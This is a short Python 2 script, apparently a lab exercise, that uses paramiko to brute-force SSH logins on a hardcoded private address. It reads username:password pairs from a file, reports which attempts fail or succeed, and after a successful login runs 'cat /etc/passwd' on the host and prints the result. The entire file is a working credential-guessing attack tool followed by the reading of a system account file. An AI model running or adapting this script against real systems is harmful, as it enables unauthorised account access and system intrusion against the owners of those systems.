#!/usr/bin/python

import paramiko
import sys
import time
from termcolor import colored


ssh=paramiko.SSHClient()

ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

fd=open(sys.argv[1],"r")


# assume the user-pass file is of the form username:password\n

for line in fd.readlines():
 user_pass=line.strip().split(':')

 try:

  ssh.connect('192.168.30.143',username=user_pass[0],password=user_pass[1])
 except paramiko.AuthenticationException:
  print '[-] Username %s and Password %s is Incorrect!' % (user_pass[0],user_pass[1])

 else:
  print colored ('[+] Username %s and Password %s is Correct!' % (user_pass[0],user_pass[1]),'green')
  time.sleep(2)
  stdin,stdout,sterr=ssh.exec_command('cat /etc/passwd')

  for line in stdout.readlines():
   print line.strip()

  break

ssh.close()
